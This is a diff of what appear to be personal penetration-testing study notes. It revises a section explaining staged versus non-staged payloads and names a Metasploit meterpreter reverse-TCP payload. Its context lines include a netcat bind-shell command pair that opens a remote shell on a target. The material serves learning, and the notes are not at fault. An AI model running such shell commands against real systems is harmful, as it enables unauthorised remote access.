@@ -141,8 +141,11 @@ nc -lvp 4444 -e /bin/sh
 # Attacker's machine
 nc 192.168.156.2 4444
 ```
-### Staged and Non-staged payload
-Non-staged payload sends a shellcode all at once. It's larger than staged payload and doe
+### Non-staged and Staged payload
+#### Non-staged payload
+Sends a shellcode all at once. It's larger than staged payload and does not always work. You can recognize it in Metasploit like this: `windows/meterpreter_reverse_tcp`
+#### Staged payload
+Sends
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -150,11 +153,11 @@ Non-staged payload sends a shellcode all at once. It's larger than staged payloa
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE3ODExNjcxNzAsMTY3NzQ1MjE3MCwxOD
-E4MTc2MjE5LC0xMDk3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5
-MjI1NCwtMzYzMTYyMDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLD
-E4NjU2MjI4MTAsLTIwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0
-OTkwOTg4LC0xNDczMTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMT
-YyLC0xODMxMzM5ODksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0x
-MDA3NTEyMjA4XX0=
+eyJoaXN0b3J5IjpbODc2ODgwOTQxLDE2Nzc0NTIxNzAsMTgxOD
+E3NjIxOSwtMTA5Nzg5MTgxMywyMDU0MTcwODU0LDE1MzQ2OTIy
+NTQsLTM2MzE2MjAwOSw0OTI4OTEzNTQsLTE0OTgyMzEwMSwxOD
+Y1NjIyODEwLC0yMDgxNDYzMjE0LC0xMDE4MzYyNjcsLTQ3NDk5
+MDk4OCwtMTQ3MzExNTM2LC0xMjQ0MTk3Mjk4LDc2Mjc4MjE2Mi
+wtMTgzMTMzOTg5LDQ2MjAyNjY3NSwtMTE3Njk1NzY5MywtMTAw
+NzUxMjIwOF19
 -->
